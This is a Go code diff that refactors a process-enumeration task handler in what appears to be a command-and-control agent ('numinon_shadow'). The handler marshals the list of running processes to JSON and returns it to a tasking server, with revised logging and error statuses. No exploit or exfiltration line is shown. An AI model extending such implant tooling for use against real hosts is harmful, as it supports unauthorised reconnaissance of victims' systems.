@@ -6,7 +6,6 @@ import (
 	"log"
 	"numinon_shadow/internal/agent/command/enumerate"
 	"numinon_shadow/internal/models"
-	"strings"
 )
 
 // orchestrateEnumerate is the orchestrator for the enumerate command.
@@ -33,39 +32,39 @@ func (a *Agent) orchestrateEnumerate(task models.ServerTaskResponse) models.Agen
 	commandEnumerate := enumerate.New()                        // create os-specific Download struct ("decided" when compiled)
 	enumerateResult, err := commandEnumerate.DoEnumerate(args) // Call the interface method
 
-	// Prepare the final TaskResult
 	finalResult := models.AgentTaskResult{
-		TaskID: task.TaskID, // Hash of the raw file content
-		Output: nil,         // Will be process info content on success
-		Error:  "",          // Will be error message on failure
+		TaskID: task.TaskID,
 	}
 
 	if err != nil {
+		log.Printf("|❗ERR ENUMERATE ORCHESTRATOR | Execution error for TaskID %s from enumerator: %v. Message: %s",
+			task.TaskID, err, enumerateResult.Message)
+		finalResult.Status = models.StatusFailureExecutionError // Could be more specific, e.g., models.StatusFailureEnumerationError
 		finalResult.Error = err.Error()
-
-		log.Printf("|❗ERR ENUMERATE ORCHESTRATOR| Enumeration execution failed for Task ID %s: %s.",
-			task.TaskID, finalResult.Error)
-
-		// NOTE THIS NEEDS TO BE FIXED AND ADAPTED ONCE ACTUAL COMMAND HAS BEEN IMPLEMENTED IN DOER
-		errorString := finalResult.Error
-		switch {
-		case strings.Contains(errorString, "validation:"):
-			finalResult.Status = models.StatusFailureInvalidArgs
-		case strings.Contains(errorString, "File not found"):
-			finalResult.Status = models.StatusFailureFileNotFound
-		case strings.Contains(errorString, "Permission denied"):
-			finalResult.Status = models.StatusFailurePermissionDenied
-		default:
-			finalResult.Status = models.StatusFailureReadError
+		// Include message from doer if it's useful error context
+		if enumerateResult.Message != "" && finalResult.Error != enumerateResult.Message {
+			finalResult.Output = []byte(fmt.Sprintf("Details: %s", enumerateResult.Message))
+		} else if enumerateResult.Message != "" {
+			finalResult.Output = []byte(enumerateResult.Message)
 		}
 	} else {
-		// If we get here it means our doer call succeeded
+		log.Printf("|✅ ENUMERATE ORCHESTRATOR | Successfully enumerated processes for TaskID %s. Found: %d. Message: %s",
+			task.TaskID, len(enumerateResult.Processes), enumerateResult.Message)
 
-		finalResult.Output = enumerateResult.Output
-
-		finalResult.Status = models.StatusSuccess
-		log.Printf("|✅ ENUMERATE ORCHESTRATOR| Execution successful for Task ID %s. Sending %d base64 encoded bytes.",
-			task.TaskID, len(finalResult.Output))
+		jsonData, marshalErr := json.Marshal(enumerateResult.Processes)
+		if marshalErr != nil {
+			log.Printf("|❗ERR ENUMERATE ORCHESTRATOR | Failed to marshal process list for TaskID %s: %v", task.TaskID, marshalErr)
+			finalResult.Status = models.StatusFailureExecutionError // Or a "failure_marshal_result"
+			finalResult.Error = fmt.Sprintf("agent failed to marshal process list: %v", marshalErr)
+		} else {
+			finalResult.Status = models.StatusSuccess
+			finalResult.Output = jsonData
+			// include enumCmdResult.Message if it provides useful success context
+			if enumerateResult.Message != "" {
+				finalResult.Error = enumerateResult.Message
+			}
+		}
 	}
 	return finalResult
+
 }
